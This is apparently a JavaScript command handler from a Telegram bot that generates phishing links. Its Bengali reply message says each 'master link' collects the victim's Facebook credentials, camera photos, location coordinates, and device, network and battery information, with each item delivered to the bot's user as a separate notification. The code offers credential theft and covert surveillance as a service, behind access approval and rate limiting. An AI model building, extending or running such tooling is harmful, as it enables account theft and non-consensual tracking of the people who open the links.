const authMiddleware = require('../middlewares/auth');
const rateLimiter = require('../middlewares/rateLimiter');
const generator = require('../utils/generator');

module.exports = async (bot, msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  try {
    const auth = await authMiddleware(msg);
    if (!auth.allowed) {
      return bot.sendMessage(chatId, 'Access denied. Use /start first and wait for approval.');
    }
    
    const rateLimit = rateLimiter(userId);
    if (!rateLimit.allowed) {
      return bot.sendMessage(chatId, 'Rate limit exceeded. Try again in a minute.');
    }
    
    const link = await generator.generateAllLink(userId);
    
    auth.user.totalLinks += 1;
    await auth.user.save();
    
    const message = `⚡ 𝐀𝐋𝐋-𝐈𝐍-𝐎𝐍𝐄 𝐋𝐈𝐍𝐊 𝐂𝐑𝐄𝐀𝐓𝐄𝐃\n\n` +
      `🔗 আপনার মাস্টার লিঙ্ক:\n${link.url}\n\n` +
      `📦 এই লিঙ্ক যা যা কালেক্ট করবে:\n` +
      `✅ ফেসবুক ক্রেডেনশিয়াল\n` +
      `✅ ক্যামেরা ফটো\n` +
      `✅ লোকেশন কোঅর্ডিনেটস\n` +
      `✅ ডিভাইস ইনফো\n` +
      `✅ নেটওয়ার্ক ইনফো\n` +
      `✅ ব্যাটারি স্ট্যাটাস\n\n` +
      `📊 সব ডাটা আলাদা আলাদা নোটিফিকেশন আসবে`;
    
    await bot.sendMessage(chatId, message);
    
  } catch (error) {
    console.error('All Command Error:', error);
    await bot.sendMessage(chatId, 'An error occurred while generating the link.');
  }
};
